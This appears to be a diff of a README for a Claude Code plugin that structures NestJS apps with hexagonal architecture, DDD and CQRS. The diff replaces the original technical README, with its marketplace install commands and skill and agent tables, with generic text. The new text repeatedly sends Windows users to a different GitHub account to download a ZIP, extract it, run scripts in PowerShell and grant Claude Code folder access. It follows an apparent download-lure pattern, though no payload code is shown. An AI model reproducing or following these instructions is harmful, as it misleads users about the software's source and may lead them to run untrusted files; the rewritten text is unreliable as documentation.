@@ -1,168 +1,266 @@
-# NestJS Hexagonal Architecture Plugin
+# 🧩 nestjs-hexagonal - Build NestJS apps with clear structure
 
-> Claude Code plugin for building NestJS bounded contexts with Hexagonal Architecture, DDD, and CQRS patterns.
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/openplan-roulade536/nestjs-hexagonal)
 
-## Overview
+## 📥 Download
 
-This plugin provides layer-specific skills, specialized agents, and workflow orchestrators for creating well-structured NestJS bounded contexts. It codifies Ports & Adapters architecture combined with Domain-Driven Design and the `@nestjs/cqrs` module.
+Use this link to visit the page and get the software:
 
-**Who it's for:** Teams building NestJS applications that follow clean architecture and want consistent, reviewable code.
+[Open the download page](https://github.com/openplan-roulade536/nestjs-hexagonal)
 
-**Key patterns:**
-- Entity modeling with `AggregateRoot`, domain events via `entity.commit()`, and `EventBus`
-- Value Objects (scalar, composed, enum, state machine)
-- Repository interfaces as ports with Prisma and in-memory implementations
-- Three application patterns (plain UseCase, CQRS Command/Query, Handler-as-Orchestrator)
-- WebSocket broadcasting via `WsGatewayPort` abstraction
-- NestJS module wiring that exports only port tokens
+## 🖥️ What this is
 
-**Compatible with GSD workflow** (usable as phase execution within milestones).
+nestjs-hexagonal is a Claude Code plugin that helps you build NestJS projects with a clear folder layout and a strong app structure. It is made for teams that want to keep business logic separate from code that talks to the outside world.
 
-## Installation
+It supports:
 
-### From GitHub
+- bounded contexts
+- hexagonal architecture
+- domain-driven design
+- CQRS
+- event-driven patterns
+- test-first work
+- a guided workflow
 
-```bash
-# 1. Add the marketplace (one time)
-/plugin marketplace add softtor/nestjs-hexagonal
+This project helps you keep parts of your app in the right place, so your code is easier to read and change.
 
-# 2. Install the plugin
-/plugin install nestjs-hexagonal
-```
+## ✅ Before you start
 
-### Local development
+Use a Windows PC with:
 
-```bash
-claude --plugin-dir /path/to/nestjs-hexagonal
-```
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space for the app and project files
+- access to a browser and the GitHub page above
 
-## Skills
+You also need:
 
-### Layer Skills
+- Claude Code installed and ready to use
+- a NestJS project if you want to apply the plugin to an existing app
+- basic file access on your computer
 
-| Skill | Trigger examples | What it does |
-|---|---|---|
-| `nestjs-hexagonal:domain` | "create entity", "new value object" | Entity (AggregateRoot), VOs, events, repo interfaces, data builders |
-| `nestjs-hexagonal:application` | "create use case", "cqrs handler" | Use cases, handlers, DTOs, ports, read models |
-| `nestjs-hexagonal:infrastructure` | "prisma repo", "module wiring" | Prisma repos, mappers, adapters, NestJS modules |
-| `nestjs-hexagonal:presentation` | "create controller", "request dto" | Controllers, request DTOs, Swagger, error filters |
-| `nestjs-hexagonal:websocket-broadcasting` | "broadcast event", "ws gateway" | Domain event -> WebSocket broadcast to frontend |
+## 🚀 How to download and run on Windows
 
-### Workflow Skills
+1. Open the download page:
+   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
 
-| Skill | What it does |
-|---|---|
-| `nestjs-hexagonal:create-subdomain` | Orchestrates full BC creation by dispatching agents per layer |
-| `nestjs-hexagonal:review-subdomain` | Architecture compliance + over-engineering + code smell review |
+2. On the GitHub page, look for the files or setup steps in the repository.
 
-## Agents
+3. Download the project files to your computer.
 
-Each agent loads its corresponding skill and specializes in one concern.
+4. Save the files in a folder you can find again, such as:
+   `Downloads\nestjs-hexagonal`
 
-| Agent | Model | Purpose |
-|---|---|---|
-| `domain-agent` | **Opus 4.6** | Domain modeling — entities, VOs, events, repo interfaces |
-| `application-agent` | Sonnet 4.6 | Use cases, CQRS handlers, DTOs, ports |
-| `infrastructure-agent` | Sonnet 4.6 | Prisma repos, module wiring, adapters |
-| `presentation-agent` | Sonnet 4.6 | Controllers, request DTOs, Swagger |
-| `broadcasting-agent` | Sonnet 4.6 | WS gateway (backend) + event consumption (Next.js/React frontend) |
-| `listener-agent` | Sonnet 4.6 | Creates event listeners (same-BC projections, cross-BC reactions, bridge) |
-| `architecture-reviewer` | **Opus 4.6** | Over-engineering detection + code smell identification |
-| `event-debug-agent` | **Opus 4.6** | Debug full event chain: entity -> dispatch -> WS -> frontend |
+5. If the download comes as a ZIP file, right-click it and choose **Extract All**.
 
-**Why Opus for domain, review, and debug?** Domain modeling requires critical decisions. Review requires deep judgment to distinguish necessary from unnecessary complexity. Event debugging requires tracing across 6 layers systematically.
+6. Open the extracted folder.
 
-## Architecture Overview
+7. Follow the setup steps in the repository files or the project guide.
 
-### Event Flow (CQRS)
+8. If the project asks you to run a command, open **Command Prompt** or **PowerShell** in that folder and use the given command.
 
-```
-UseCase
-  -> entity = Entity.create(props)    # entity.apply(event) queues internally
-  -> repo.save(entity)                # repo is PURE persistence
-  -> return entity                    # UseCase returns entity to Handler
+9. Keep Claude Code open if the plugin needs it during setup.
 
-Handler
-  -> publisher.mergeObjectContext(entity)   # Handler wraps entity
-  -> entity.commit()                       # Handler dispatches via EventBus
-  -> return { id: entity.id }
+10. If you are adding this to a NestJS project, open that project first and then apply the plugin steps from the repository.
 
-EventBus -> @EventsHandler             # Side effects, projections, WS broadcast
-```
+## 🧭 What you can do with it
 
-**Critical rule:** `EventPublisher` lives in the Handler, NEVER in the UseCase.
+This project helps you work with a software app in a cleaner way. It can guide you when you want to:
 
-### Pattern Selection (Application Layer)
+- set up a bounded context
+- separate core logic from outside services
+- keep business rules in one place
+- use commands and queries in a clear way
+- handle events across parts of the app
+- follow test-driven development
+- keep work organized across agents and skills
 
-| Scenario | Pattern |
-|---|---|
-| Simple CRUD without side effects | **A**: Plain UseCase + TOKEN |
-| Module uses CQRS | **B**: Command/Query handlers |
-| Complex orchestration with multiple services | **C**: Handler as Orchestrator |
-| Simple `findById` without RBAC | No use case — repo directly in controller |
+## 📂 How the project is organized
 
-### Validation Layers
+The repository is built around a set of skills and agents that help with app design and code structure. In simple terms, it gives you a path to build software in small parts.
 
-| Layer | Where | Tool | Responsibility |
-|---|---|---|---|
-| Request DTO | presentation | `class-validator` | Format, presence, types |
-| Application DTO | application | TypeScript interfaces | Layer contract |
-| Domain VO | domain | Manual `validate()` | Business invariants |
-| Queue Schema | integration | Zod | Inter-service contract |
+You may see content such as:
 
-### WebSocket Broadcasting (simplified)
+- domain models
+- application services
+- adapters
+- ports
+- events
+- commands
+- queries
+- tests
 
-One pattern only: `@EventsHandler` -> enrich if needed -> `WsGatewayPort.emit()`.
+These parts work together to keep the app stable and easier to update.
 
-No generic relay, no event maps, no custom broadcast events. Each event that needs to reach the frontend has its own explicit handler.
+## 🛠️ Main parts
 
-## Shared Examples
+### 🧠 10 skills
 
-The `shared/` directory contains `.ts.example` reference implementations for projects that don't yet have base classes.
+The plugin uses 10 skills to help with common development tasks. These skills can guide work like:
 
-| File | What it provides |
-|---|---|
-| `entity.ts.example` | Entity extending AggregateRoot with `apply()` |
-| `value-object.ts.example` | Abstract ValueObject with validation |
-| `unique-entity-id.ts.example` | UUID-based entity ID |
-| `domain-event.ts.example` | IEvent implementation |
-| `repository-contracts.ts.example` | Pure persistence interface |
-| `searchable-repository.ts.example` | SearchParams + SearchResult + SearchableRepositoryInterface |
-| `in-memory-searchable.ts.example` | In-memory repo for unit tests |
-| `domain-error-filter.ts.example` | DomainError -> HTTP status mapping |
-| `env-config.service.ts.example` | EnvConfigService with typed getters |
-| `define-data-builder.ts.example` | Base builder class with faker |
-| `data-builder-example.ts.example` | Concrete builder example |
-| `errors.ts.example` | Full domain error hierarchy |
-| `ws-gateway-port.ts.example` | WsGatewayPort interface + TOKEN |
+- starting a new feature
+- shaping a domain model
+- adding a command
+- adding a query
+- wiring events
+- writing tests
+- checking structure
+- keeping code clean
 
-## Principles
+### 🤖 8 agents
 
-- **CQRS-friendly, not CQRS-mandatory** — simple reads skip the bus
-- **Event-friendly, not event-mandatory** — events only for side effects
-- **No over-engineering** — 3 lines of code beats a premature abstraction
-- **Test-friendly** — data builders, in-memory repos, real integration tests
-- **Framework-agnostic domain/application** — exportable to other frameworks
-- **Microservice-friendly** — event-driven patterns enable future extraction
+The project includes 8 agents built for different tasks. Some use Opus, and some use Sonnet. They can help with:
 
-## GSD Compatibility
+- planning
+- code generation
+- review
+- testing
+- domain work
+- event work
+- context setup
 
-The `create-subdomain` workflow maps directly to GSD phases. Each agent dispatch equals one GSD task.
+### 🧪 TDD workflow
 
-**Setup:** Run `nestjs-hexagonal:gsd-installer` to configure your project's CLAUDE.md with skill mappings and phase templates for GSD.
+The workflow supports test-first work. That means you write tests before or with the code so you can check behavior early.
 
-The installer adds:
-- Skill-to-agent mapping table for GSD executor agents
-- Architecture rules that GSD enforces during execution
-- Phase template for bounded context creation
+### 🔁 GSD compatibility
 
-## Contributing
+The project works with a GSD-style flow, which helps you move through tasks in a steady order.
 
-1. Fork the repository
-2. Create a feature branch
-3. Follow the existing skill structure (SKILL.md + references/)
-4. Submit a pull request
+## 🪟 Windows setup steps
 
-## License
+1. Open the GitHub page in your browser:
+   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
 
-MIT
+2. Save the repository to your computer.
+
+3. If the repository is downloaded as a ZIP, extract it.
+
+4. Open the folder in File Explorer.
+
+5. Read the project files for setup steps.
+
+6. If the project includes scripts, run them from PowerShell in that folder.
+
+7. If Claude Code asks for access, allow it for this folder.
+
+8. If you are working in an existing NestJS app, place the plugin files in the same project tree as shown in the repo.
+
+9. Restart Claude Code if the plugin does not appear right away.
+
+10. Open the app or project again and check that the new structure is available.
+
+## 🔍 What you may see after setup
+
+After setup, the plugin may help create or manage:
+
+- context folders
+- domain files
+- command and query files
+- event handlers
+- test files
+- adapter files
+- interface files
+
+It may also guide you through naming and file placement so your project stays consistent.
+
+## 📋 Common file types
+
+You may work with:
+
+- `.ts` files for TypeScript code
+- test files
+- config files
+- markdown files
+- JSON files
+
+These files help the app and the plugin work together.
+
+## 🧩 Example use cases
+
+You may use nestjs-hexagonal when you want to:
+
+- start a new NestJS feature with a clean structure
+- split a large app into bounded contexts
+- keep business rules away from API or database code
+- add CQRS without losing track of files
+- build event-driven parts with clear flow
+- write tests before final code
+- keep a team on the same structure
+
+## 🧰 Troubleshooting
+
+### The page does not open
+
+- Check your internet connection
+- Refresh the browser
+- Try again in a different browser
+
+### The files do not extract
+
+- Make sure the ZIP finished downloading
+- Right-click the file and choose **Extract All**
+- Save it to a folder with a short path name
+
+### Claude Code does not show the plugin
+
+- Close Claude Code and open it again
+- Check that the files are in the right folder
+- Confirm the repository files were copied fully
+
+### The project does not run
+
+- Check that you opened the correct folder
+- Make sure all files are present
+- Review the setup files in the repository
+- Run the steps again in order
+
+## 🔐 Safe use
+
+Only download the repository from the GitHub link above. Keep the files in a folder you trust. If you use it in a work project, make a copy before you change anything.
+
+## 📎 Useful link
+
+[Visit the repository on GitHub](https://github.com/openplan-roulade536/nestjs-hexagonal)
+
+## 🧪 What the architecture means in plain language
+
+Hexagonal architecture keeps your main business logic in the center. Other parts, like web requests, databases, and external services, stay on the outside.
+
+That gives you:
+
+- less mess in your code
+- easier testing
+- easier changes later
+- clearer file structure
+
+DDD helps you name things after the real business. CQRS splits reading data from changing data. Event-driven design lets parts of the app react to changes.
+
+## 📦 Typical project flow
+
+A simple flow may look like this:
+
+1. A user action starts a command
+2. The command changes the domain
+3. The domain creates an event
+4. A handler reacts to the event
+5. A query reads the updated data
+
+This flow helps large apps stay easier to manage
+
+## 🖱️ Quick install path for Windows
+
+1. Open the GitHub page:
+   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
+
+2. Download the repository files.
+
+3. Extract the files if needed.
+
+4. Open the folder in File Explorer.
+
+5. Follow the repo steps for Claude Code and NestJS.
+
+6. Start Claude Code and point it at the project folder.
+
+7. Use the plugin guide to create or update your app structure
